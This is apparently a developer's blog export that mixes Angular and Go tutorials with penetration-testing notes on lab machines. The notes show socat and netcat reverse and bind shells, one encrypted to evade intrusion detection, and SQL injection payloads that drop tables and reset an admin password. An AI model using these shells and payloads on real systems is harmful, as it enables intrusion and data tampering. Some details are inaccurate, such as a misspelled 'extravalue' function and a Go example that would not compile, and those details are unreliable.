{"meta":{"title":"congdong007","subtitle":"Penetration Test、Software Developer","description":"Python、Typescript、Go、C/C++、asm、Bash","author":"Dong Cong","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-10-16T16:11:55.341Z","updated":"2023-10-16T16:11:55.341Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-10-15T00:30:44.000Z","updated":"2023-10-16T14:06:43.380Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Angular from Beginner to Hero (1) -- Setting up the Local Environment and Workspace","slug":"angular-start","date":"2022-06-19T01:07:20.000Z","updated":"2023-10-19T20:31:51.209Z","comments":true,"path":"2022/06/18/angular-start/","link":"","permalink":"http://example.com/2022/06/18/angular-start/","excerpt":"","text":"Prerequisites To use the Angular framework, you should be familiar with the following: – JavaScript – HTML – CSS Knowledge of TypeScript is helpful, but not required. To install Angular on your local system, you need the following: Node.js:Angular requires an active LTS or maintenance LTS version of Node.js.Here’s the newest version in nodejs.org&#x2F;en:If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.12node -vv16.17.1 npm Package Manager:Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window. Install the Angular CLI To install the Angular CLI, open a terminal window and run the following command: 1npm install -g @angular/cli Create a workspace and initial application You develop apps in the context of an Angular workspace. To create a new workspace and initial starter app: 1. Run the CLI command ng new and provide the name my-app, as shown here: 1ng new my-app 2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key. The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes. The CLI creates a new workspace and a simple Welcome app, ready to run. Run the application The Angular CLI includes a server, for you to build and serve your app locally. Navigate to the workspace folder, such as my-app. Run the following command: 12cd my-appng serve --open The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files. The –open (or just -o) option automatically opens your browser to http://localhost:4200/. If your installation and setup was successful, you should see a page similar to the following. Compile and Package Angular CLI also provides commands: 1ng build --prod Among them, the parameter –prod tells the compilation environment to compile for the production environment package. Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows. 123456789101112131415&quot;configurations&quot;: &#123; ... &quot;budgets&quot;: [ &#123; &quot;type&quot;: &quot;initial&quot;, &quot;maximumWarning&quot;: &quot;5mb&quot;, &quot;maximumError&quot;: &quot;10mb&quot; &#125;, &#123; &quot;type&quot;: &quot;anyComponentStyle&quot;, &quot;maximumWarning&quot;: &quot;1mb&quot;, &quot;maximumError&quot;: &quot;4mb&quot; &#125; ],&#125; Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files. Deploy to a Server Using the “phpStudy” tool, go into its root directory, which is usually something like “C:\\phpStudy\\PHPTutorial\\WWW.” Copy all the files from the ‘dist’ directory to the root directory “C:\\phpStudy\\PHPTutorial\\WWW.” Restart phpStudy’s services to make sure the changes take effect. Open your Chrome browser, and you should be able to access the website by entering the following URL in the address bar: http://localhost/index.html Make sure you have the correct directory paths, and that the files from the ‘dist’ directory are copied over to the correct location in the root directory. Additionally, ensure that the web server and PHP services in phpStudy are correctly configured and running.","categories":[{"name":"Angular from Beginner to Hero","slug":"Angular-from-Beginner-to-Hero","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/"},{"name":"(1) Setting up the Local Environment and Workspace","slug":"Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"}],"tags":[]},{"title":"About File Testing in the Go Language.","slug":"goAboutUnitTest","date":"2019-02-13T01:59:33.000Z","updated":"2023-10-17T16:31:11.713Z","comments":true,"path":"2019/02/12/goAboutUnitTest/","link":"","permalink":"http://example.com/2019/02/12/goAboutUnitTest/","excerpt":"","text":"To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code within it. Here’s an example: you have a file named math.go containing a simple mathematical function ‘Add.’ Then, you will create a test file named math_test.go to test this function. Assuming the math.go file is as follows: 1234567// math.gopackage mainfunc Add(a, b int) int &#123; return a + b&#125; You can then create a math_test.go file to write your test code: 12345678910111213// math_test.gopackage mainimport &quot;testing&quot;func TestAdd(t *testing.T) &#123; result := Add(2, 3) expected := 5 if result != expected &#123; t.Errorf(&quot;Add(2, 3) returned %d, expected %d&quot;, result, expected) &#125;&#125; In math_test.go, we import the testing package and write a test function named TestAdd. Test functions should start with ‘Test’ and accept a *testing.T parameter, which is used to report test failures. Inside the TestAdd function, we call Add(2, 3) to execute the function being tested and compare the result to the expected value. If the result doesn’t match the expected value, we use t.Errorf to report the test failure with detailed error information. Next, you can run the tests using the ‘go test‘ command in your terminal: 1go test Go will search for all the _test.go files in the current directory and execute the test functions within them. If the tests pass, you’ll see a success message. If the tests fail, you’ll get detailed failure information. This is just a very basic example. In real-world projects, you can write more test cases to cover various scenarios and ensure that your code works correctly in different situations.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Unit Test","slug":"Go/Unit-Test","permalink":"http://example.com/categories/Go/Unit-Test/"}],"tags":[]},{"title":"nil in the Go language","slug":"goNil","date":"2019-01-04T03:59:12.000Z","updated":"2023-10-17T15:38:41.786Z","comments":true,"path":"2019/01/03/goNil/","link":"","permalink":"http://example.com/2019/01/03/goNil/","excerpt":"","text":"In the Go language, “nil“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “nil“: Pointer and Reference Types: The most common use of “nil“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “nil“ is used in the following cases: 123var ptr *int // Declare an integer pointer, its zero value is nilvar slice []int // Declare an integer slice, its zero value is nilvar m map[string]int // Declare a map, its zero value is nil Interface Types: “nil“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned). 12345var myInterface interface&#123;&#125;if myInterface == nil &#123; fmt.Println(&quot;The interface is empty&quot;)&#125; Function and Method Return Values: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “nil,” indicating that there are no valid return values. 12345678func findValue(slice []int, target int) (*int, bool) &#123; for i, val := range slice &#123; if val == target &#123; return &amp;slice[i], true &#125; &#125; return nil, false&#125; It’s important to handle “nil“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “nil“ before accessing them to ensure safety.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"nil","slug":"Go/nil","permalink":"http://example.com/categories/Go/nil/"}],"tags":[]},{"title":"panic() and recover() in the Go Language","slug":"goPanicAndRecover","date":"2018-12-31T01:48:46.000Z","updated":"2023-10-17T15:39:09.027Z","comments":true,"path":"2018/12/30/goPanicAndRecover/","link":"","permalink":"http://example.com/2018/12/30/goPanicAndRecover/","excerpt":"","text":"panic() and recover() are two important functions in the Go language for handling exceptions. Here is a simple example that demonstrates how to use panic() and recover() in Go. 1234567891011121314151617181920212223242526272829package mainimport ( &quot;fmt&quot;)// A function to simulate a situation that might cause a panicfunc doSomething() &#123; defer func() &#123; if err := recover(); err != nil &#123; fmt.Println(&quot;Panic occurred but recovered:&quot;, err) &#125; &#125;() // Simulate a problematic situation num1 := 10 num2 := 0 result := num1 / num2 // This will cause a division by zero panic fmt.Println(&quot;Result is:&quot;, result) // This won&#x27;t be printed as the panic has already occurred&#125;func main() &#123; fmt.Println(&quot;Starting the program&quot;) doSomething() fmt.Println(&quot;Program continues to execute&quot;) // Even if a panic occurs, this line will be printed because the panic has been recovered in doSomething()&#125; In the example above, the doSomething() function attempts to divide 10 by 0, which would lead to a division by zero panic. However, we use defer() and recover() to catch and handle the panic. In the main() function, even if a panic occurs within doSomething(), the program continues to execute, and the panic information is printed within the recover() block. Running this program will produce the following output: 1234Starting the programPanic occurred but recovered: runtime error: integer divide by zeroProgram continues to execute This demonstrates that the recover() function successfully catches the panic, allowing the program to continue executing without terminating.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"panic() and recover()","slug":"Go/panic-and-recover","permalink":"http://example.com/categories/Go/panic-and-recover/"}],"tags":[]},{"title":"defer in the Go Language","slug":"goDefer","date":"2018-12-17T04:33:42.000Z","updated":"2023-10-17T15:38:15.816Z","comments":true,"path":"2018/12/16/goDefer/","link":"","permalink":"http://example.com/2018/12/16/goDefer/","excerpt":"","text":"In Go language, defer is a very useful keyword used for deferring the execution of functions, typically employed for performing cleanup or resource release operations before a function returns. A defer statement pushes the function call that should be deferred onto a stack and executes these deferred function calls in a last-in, first-out (LIFO) order just before the current function returns. Here are some important features and uses of defer: Deferred Execution: Using the defer keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error. Resource Cleanup: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks. Parameter Evaluation: The parameters in a defer statement are evaluated when the defer statement is executed, not when the function returns. Here are some examples demonstrating the use of defer: 123456789101112131415161718192021222324252627282930313233package mainimport &quot;fmt&quot;func main() &#123; // Example 1: defer for file closing file := openFile(&quot;example.txt&quot;) defer closeFile(file) // Example 2: defer for logging function execution time defer logTime(&quot;Function execution&quot;) // Example 3: Multiple defer statements execute in a last-in, first-out order for i := 1; i &lt;= 5; i++ &#123; defer fmt.Println(&quot;Deferred statement&quot;, i) &#125; fmt.Println(&quot;Function body&quot;)&#125;func openFile(filename string) *File &#123; fmt.Println(&quot;Opening file:&quot;, filename) return // Open the file and return the file handle&#125;func closeFile(file *File) &#123; fmt.Println(&quot;Closing file&quot;) // Close the file&#125;func logTime(message string) &#123; fmt.Println(message, &quot;at some time&quot;)&#125; In the above examples, defer statements are used to ensure the file is closed before main returns, log the execution time of the function, and execute multiple defer statements in a last-in, first-out order. defer is a powerful tool in Go that can help you write safer and cleaner code, ensuring proper resource release and consistency.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"defer","slug":"Go/defer","permalink":"http://example.com/categories/Go/defer/"}],"tags":[]},{"title":"Closure and Anonymous Function in Go","slug":"goAnonymousFunctionClosure","date":"2018-11-29T02:21:24.000Z","updated":"2023-10-17T15:38:03.764Z","comments":true,"path":"2018/11/28/goAnonymousFunctionClosure/","link":"","permalink":"http://example.com/2018/11/28/goAnonymousFunctionClosure/","excerpt":"","text":"In Go language, closures and anonymous functions are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts: Closure Example:A closure refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables. 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() &#123; outerVar := 10 // Closure function closure := func() &#123; fmt.Println(&quot;Outer variable outerVar:&quot;, outerVar) &#125; // Call the closure function closure() // Output: Outer variable outerVar: 10 // Modify the outer variable outerVar = 20 // Call the closure function again closure() // Output: Outer variable outerVar: 20&#125; In the above example, closure is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function. Anonymous Function Example: An anonymous function is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions. 1234567891011121314151617181920package mainimport &quot;fmt&quot;func main() &#123; // Define and call an anonymous function result := func(x, y int) int &#123; return x + y &#125;(5, 3) fmt.Println(&quot;Result of the anonymous function:&quot;, result) // Output: Result of the anonymous function: 8 // Assign an anonymous function to a variable add := func(x, y int) int &#123; return x + y &#125; sum := add(10, 20) fmt.Println(&quot;Calling the anonymous function using a variable:&quot;, sum) // Output: Calling the anonymous function using a variable: 30&#125; In the above example, we define an anonymous function and call it directly. We also assign another anonymous function to the add variable and use that variable to call the function. To summarize the differences: A closure is a function that captures external variables and can access and modify them outside of the function.An anonymous function is a function without a name, which can be assigned to a variable or passed as an argument to other functions.It’s important to note that while closures often involve anonymous functions, not all anonymous functions are closures. A closure is a specific type of anonymous function that captures external variables.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Closure and Anonymous Function","slug":"Go/Closure-and-Anonymous-Function","permalink":"http://example.com/categories/Go/Closure-and-Anonymous-Function/"}],"tags":[]},{"title":"A Brief Summary of \"go func()\"","slug":"goFunc","date":"2018-11-17T04:00:34.000Z","updated":"2023-10-17T15:38:25.992Z","comments":true,"path":"2018/11/16/goFunc/","link":"","permalink":"http://example.com/2018/11/16/goFunc/","excerpt":"","text":"“go func()” is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using “go func()” allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management. Here is a basic example and some key concepts of using “go func()”: Basic Example: 1234567func main() &#123; go func() &#123; // Place the code you want to execute in a new concurrent goroutine here &#125;() // The main goroutine continues to execute other work&#125; In the example above, “go func()” starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background. Key Concepts: Anonymous Function: Anonymous functions are typically used to define “go func()” because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed. Concurrent Execution: Goroutines launched with “go func()” run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance. Data Sharing: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data. Goroutine Management: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction. Waiting for Goroutines to Complete: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting. Using “go func()” is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"go func()","slug":"Go/go-func","permalink":"http://example.com/categories/Go/go-func/"}],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"Socat","slug":"Pentest-socat","date":"2016-12-06T00:26:27.000Z","updated":"2023-10-21T22:00:20.508Z","comments":true,"path":"2016/12/05/Pentest-socat/","link":"","permalink":"http://example.com/2016/12/05/Pentest-socat/","excerpt":"","text":"Socat is a command-line utility that establishes two bidirectional byte streams and transfers databetween them. For penetration testing, it is similar to Netcat but has additional useful features. While there are a multitude of things that socat can do, we will only cover a few of them to illustrateits use. Socat File TransfersServer side: 12┌──(root㉿kali)-[/home/kali/Desktop]└─# socat TCP4-LISTEN:443,fork file:nmap-list.txt Client side: 123456C:\\Users\\Administrator\\Desktop\\socat&gt; socat TCP4:192.168.244.140:443 file:nmap-list.txt ,createC:\\Users\\Administrator\\Desktop\\socat&gt; type nmap-list.txtStarting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 23:19 EDTWarning: 199.241.133.26 giving up on port because retransmission cap hit (10).Stats: 0:07:04 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan... Socat Reverse ShellsServer side: 12C:\\Users\\Administrator\\Desktop\\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT... socat[5640] N listening on AF=2 0.0.0.0:443 Client side:When client side type follow command : 12┌──(root㉿kali)-[/home/kali/Desktop]└─# socat TCP4:192.168.244.140:443 EXEC:/bin/bash Then the server side , look like: 123456789C:\\Users\\Administrator\\Desktop\\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT... socat[5640] N listening on AF=2 0.0.0.0:443... socat[5640] N accepting connection from AF=2 192.168.244.140:54720 on 192.168.244.144:443... socat[5640] N using stdout for reading and writing... socat[5640] N starting data transfer loop with FDs [4,4] and [1,1]whoamirootiduid=0(root) gid=0(root) groups=0(root) Socat Encrypted Bind ShellsTo add encryption to a bind shell, we will rely on Secure Socket Layer certificates. This level ofencryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitivedata we are transceiving.To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:• req: initiate a new certificate signing request• -newkey: generate a new private key• rsa:2048: use RSA encryption with a 2,048-bit key length.• -nodes: store the private key without passphrase protection• -keyout: save the key to a file• -x509: output a self-signed certificate instead of a certificate request• -days: set validity period in days• -out: save the certificate to a file Once we generate the key, we will cat the certificate and its private key into a file, which we willeventually use to encrypt our bind shell. Server side: 12345678910111213141516171819202122232425┌──(root㉿kali)-[/home/kali/Desktop]└─# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt...+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+.....+.+...+.....+......+.+......+.....+.......+.....+...............+.+.....+.+......+...+..+....+...+...+..................+.........+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+......+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+.+......+...+..+.+.....+.........+......+...+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+....+........+....+.....+.+.....+...+.......+..+.......+........+.+.....+.+...+........+.........+..................+......+.........+......+..........+.........+..+....+.........+......+.........+...+..+...+....+........+......+.+.........+......+...........+...+.......+...........................+.....+.......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#x27;.&#x27;, the field will be left blank.-----Country Name (2 letter code) [AU]:CAState or Province Name (full name) [Some-State]:QuebecLocality Name (eg, city) []:MontrealOrganization Name (eg, company) [Internet Widgits Pty Ltd]:RaohuaOrganizational Unit Name (eg, section) []:Try Harder DepartmentCommon Name (e.g. server FQDN or YOUR name) []:Email Address []: ┌──(root㉿kali)-[/home/kali/Desktop]└─# cat bind_shell.key bind_shell.crt &gt; bind_shell.pem ┌──(root㉿kali)-[/home/kali/Desktop]└─# socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash Client side: 123456789101112131415161718192021C:\\Users\\Administrator\\Desktop\\socat&gt; socat - OPENSSL:192.168.244.140:443,verify=0iduid=0(root) gid=0(root) 0=1000(root)whoamirootip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:f9:b4:b9 brd ff:ff:ff:ff:ff:ff inet 192.168.244.140/24 brd 192.168.244.255 scope global dynamic noprefixroute eth0 valid_lft 1168sec preferred_lft 1168sec inet6 fe80::9d6e:bd4e:a4b2:6ffb/64 scope link noprefixroute valid_lft forever preferred_lft forever3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:1d:28:b9:62 brd ff:ff:ff:ff:ff:ff","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Socat","slug":"Penetration-Test/Practical-Tools/Socat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"}],"tags":[]},{"title":"Netcat","slug":"Pentest-nc","date":"2016-12-02T04:04:37.000Z","updated":"2023-10-21T22:00:01.691Z","comments":true,"path":"2016/12/01/Pentest-nc/","link":"","permalink":"http://example.com/2016/12/01/Pentest-nc/","excerpt":"","text":"Netcat first released in 1995(!) by Hobbit is one of the “original” network penetration testingtools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”.The clearest definition of Netcat is from Hobbit himself: a simple “utility which reads and writesdata across network connections, using TCP or UDP protocols. Connecting to a TCP&#x2F;UDP Port We can use client mode to connect to any TCP&#x2F;UDP port, allowing us to:• Check if a port is open or closed.• Read a banner from the service listening on a port.• Connect to a network service manually. Example: 1nc -nv 10.11.10.2 110 -n option to skip DNS name resolution;-v to add some verbosity; Output: 12345678(UNKNOWN) [10.11.10.2] 110 (pop3) open+OK Dovecot ready.USER offsec+OKPASS offsec-ERR [AUTH] Authentication failed.quit+OK Logging out Listening on a TCP&#x2F;UDP Port Example: First , server start listening: 123//From server : msfadmin@metasploitable:~$ nc -nlvp 4444listening on [any] 4444 ... Then client try to connect server,and send “hello world”: 12345//From client : ┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.136 4444(UNKNOWN) [192.168.244.136] 4444 (?) openhello world The server will receive message “hello world”: 12345//From server : msfadmin@metasploitable:~$ nc -nlvp 4444listening on [any] 4444 ...connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 47386hello world Transferring Files with Netcat From Server: 123//From server : C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 &gt; mync.exelistening on [any] 4444 ... From client : 1234//From client : ┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 &lt; /home/kali/Desktop/nc.exe (UNKNOWN) [192.168.244.143] 4444 (?) open Notice that we have not received any feedback from Netcat about our file upload progress. In thiscase, since the file we are uploading is small, we can just wait a few seconds, then check whetherthe file has been fully uploaded to the Windows machine by attempting to run it: 1234567891011C:\\Users\\Administrator\\Desktop\\nc&gt;mync -h[v1.10-47]connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port]options: -c shell commands as `-e&#x27;; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts ...port numbers can be individual or ranges: lo-hi [inclusive];hyphens in port names must be backslash escaped (e.g. &#x27;ftp\\-data&#x27;). Netcat Bind Shell Scenario Run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port: 12C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ... Client: 1234567891011121314151617181920212223242526┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 (UNKNOWN) [192.168.244.143] 4444 (?) openMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Users\\Administrator\\Desktop\\netcat-1.11&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : localdomain Link-local IPv6 Address . . . . . : fe80::6d45:b51c:b367:2f09%11 IPv4 Address. . . . . . . . . . . : 192.168.244.143 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.244.2Tunnel adapter isatap.localdomain: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : localdomainC:\\Users\\Administrator\\Desktop\\netcat-1.11&gt; This is indeed a “gaping security hole”! Reverse Shell ScenarioServer:12C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ... Client: 123┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 (UNKNOWN) [192.168.244.143] 4444 (?) open Then server side shows like: 123456789C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ...connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 35156lscode.desktopnc.exeip address show eth0 | grep inetinet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Netcat","slug":"Penetration-Test/Practical-Tools/Netcat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"}],"tags":[]},{"title":"MySQL Stack-Based SQL Injection","slug":"SQLInjectionMySQLStackBased","date":"2016-11-30T04:22:05.000Z","updated":"2023-10-19T15:36:07.842Z","comments":true,"path":"2016/11/29/SQLInjectionMySQLStackBased/","link":"","permalink":"http://example.com/2016/11/29/SQLInjectionMySQLStackBased/","excerpt":"","text":"In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements together. Stack-based injection is different from other injection techniques and has limitations. 12%27 --- &#x27;%20 --- space How can you find the table fields and table names of the other party? Look for exploitable files using directory traversal vulnerabilities, such as files with a .sql extension. Use directory&#x2F;file fuzzing tools like Dirsearch, etc., to search for .sql files. Search for source code leakage vulnerabilities on the other party’s website; the source code may contain exploitable files. Search for the other party’s website source code on GitHub. Example: 12345http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27; //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;; // it&#x27;s okhttp://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;create table aa like users; //create a table named aa, structure like table usershttp://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;drop table aa--+http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;update users set password =&#x27;admin@1234&#x27; where username=&#x27;admin&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Stack-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"}],"tags":[]},{"title":"HTTP Header SQL Injection","slug":"SQLInjectionHttpHeader","date":"2016-11-26T02:11:31.000Z","updated":"2023-10-19T15:20:17.106Z","comments":true,"path":"2016/11/25/SQLInjectionHttpHeader/","link":"","permalink":"http://example.com/2016/11/25/SQLInjectionHttpHeader/","excerpt":"","text":"HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation. Example : 12345678910111213141516POST /sqli-labs-master/Less-18/ HTTP/1.1Host: 192.168.1.33Content-Length: 38Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.1.33Content-Type: application/x-www-form-urlencodedUser-Agent:1&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;1&#x27;=&#x27;1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.1.33/sqli-labs-master/Less-18/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeuname=admin&amp;passwd=admin&amp;submit=Submit 1XPATH syntax error: &#x27;~root@localhost~&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"HTTP Header SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"}],"tags":[]},{"title":"MySQL Error-Based SQL Injection","slug":"SQLInjectionMySQLError","date":"2016-11-23T01:55:15.000Z","updated":"2023-10-19T15:20:20.371Z","comments":true,"path":"2016/11/22/SQLInjectionMySQLError/","link":"","permalink":"http://example.com/2016/11/22/SQLInjectionMySQLError/","excerpt":"","text":"Overview Error-Based Injection involves deliberately triggering error conditions in the database to make query results appear in error messages. This technique is particularly useful in cases where UNION-based injections are restricted and error information can be returned. It’s also known as Formulaic SQL Injection. Utilizing the updatexml() function: Payload: 1?id=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--+ 0x7e: ~updatexml(): Function used to update XML documents.updatexml() syntax: update(target_xml_document, xpath_expression, new_value)XPath expressions are used to specify paths within an XML document. If the format is incorrect, an error will occur. Subsequent steps for updatexml-based error-based injection: (1). Modify the SQL statement for selecting the user position.(2). Retrieve tables in the current database.(3). Retrieve columns of a specific table.(4). Continue step by step. Utilizing the extravalue() function: Payload: 1?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+ extravalue() function is similar to updatexml() and is used for querying node content in an XML document.Subsequent steps for extravalue-based error-based injection are the same as for updatexml. Utilizing the floor() function: Payload: 1?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ The principle utilized is the repetition of primary keys due to the repetitiveness of floor(rand(0)*2), leading to an error in the group by statement.The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the 